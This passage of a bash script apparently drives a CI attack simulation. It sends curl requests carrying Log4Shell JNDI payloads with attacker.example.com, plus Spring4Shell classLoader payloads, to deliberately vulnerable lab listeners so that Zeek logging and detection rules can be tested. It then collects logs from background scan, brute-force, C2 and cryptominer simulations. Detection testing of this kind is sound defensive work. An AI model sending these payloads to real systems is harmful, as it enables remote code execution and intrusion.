  "http://${VICTIM_IP}/api/exfil" || true

# ---------- Vulhub-targeted exploitation ----------
# These hit the deliberately-vulnerable listeners installed by
# victim_setup.sh: Log4Shell via Solr on :8983, Spring4Shell via
# Tomcat on :8080. Unlike the pattern-only probes earlier in the
# script (which just emit signatures against nginx :80), these reach
# real Log4j / Spring instances so Zeek captures request+response in
# http.log and detect-webapps can identify the stack.
echo "[33] Vulhub-targeted exploitation (Log4Shell + Spring4Shell)"

# Log4Shell — Solr admin-cores endpoint. The JNDI lookup will fail to
# resolve (no attacker LDAP server in the isolated VPC) but the request
# reaches Log4j's lookup path, which is what the rule and Zeek parser
# both need.
timeout 10 curl -s -o /dev/null --max-time 5 \
  "http://${VICTIM_IP}:8983/solr/admin/cores?action=\${jndi:ldap://attacker.example.com/exploit}" \
  || true
timeout 10 curl -s -o /dev/null --max-time 5 \
  -H 'User-Agent: ${jndi:ldap://attacker.example.com/ua}' \
  "http://${VICTIM_IP}:8983/solr/" || true
timeout 10 curl -s -o /dev/null --max-time 5 \
  -H 'X-Api-Version: ${jndi:ldap://attacker.example.com/hdr}' \
  "http://${VICTIM_IP}:8983/solr/admin/info/system" || true

# Spring4Shell — classLoader manipulation against Tomcat.
timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di' \
  "http://${VICTIM_IP}:8080/" || true
timeout 10 curl -s -o /dev/null --max-time 5 \
  "http://${VICTIM_IP}:8080/?class.module.classLoader.URLs%5B0%5D=0" || true

echo "=== Fast serial probes complete; waiting on background groups ==="
wait "$NMAP_PID"         2>/dev/null || true
wait "$HYDRA_PID"        2>/dev/null || true
wait "$NIKTO_PID"        2>/dev/null || true
wait "$LATERAL_PID"      2>/dev/null || true
wait "$NUCLEI_PID"       2>/dev/null || true
wait "$FLIGHTSIM_PID"    2>/dev/null || true
wait "$IMPACKET_AD_PID"  2>/dev/null || true
wait "$DOH_PID"          2>/dev/null || true
wait "$CVE2024_PID"      2>/dev/null || true
wait "$HTTP2_PID"        2>/dev/null || true
wait "$SAAS_C2_PID"      2>/dev/null || true
wait "$CRYPTOMINER_PID"  2>/dev/null || true

# Dump the background-group logs in a stable, named order so CI output
# is deterministic even though the groups finished in arbitrary order.
for g in nmap hydra nikto lateral nuclei flightsim impacket-ad doh cve2024 http2 saas-c2 cryptominer; do
  echo "::group::bg-${g}"
  cat "$LOGDIR/${g}.log" 2>/dev/null || true
  echo "::endgroup::"
done
rm -rf "$LOGDIR"

echo "=== Attack simulation complete ==="
